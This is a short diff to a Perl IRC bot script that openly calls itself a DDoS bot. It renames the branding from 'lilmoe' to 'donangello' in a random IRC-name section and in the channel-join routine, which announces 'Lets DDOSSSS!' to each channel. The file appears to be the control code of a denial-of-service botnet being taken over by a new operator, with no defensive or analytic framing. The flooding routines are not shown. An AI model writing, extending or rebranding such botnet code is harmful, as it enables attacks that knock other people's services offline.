@@ -119,7 +119,7 @@ my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainther
  
 my $ircname = $rircname[rand scalar @rircname];
  
-## my @rrealname = ("4,1[ lilmoe Security Team ]",
+## my @rrealname = ("4,1[ donangello Security Team ]",
 ##                                  "4,1 /!\ DDoS Security Team /!\ ",
 ##                                  "12,1<///8,1///4,1###>",
 ##                  "2,1---=== 4,1 DDoS Security Team 2,1===---");
@@ -370,7 +370,7 @@ elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
   foreach my $canal (@channels) {
         sendraw("MODE $nick +x");
     sendraw("JOIN $canal");
-        sendraw("PRIVMSG $canal :4,1 [lilmoes's dd0s b0ts] 9,1Lets DDOSSSS!... ");
+        sendraw("PRIVMSG $canal :4,1 [donangello's dd0s b0ts] 9,1Lets DDOSSSS!... ");
 }
 }
 }
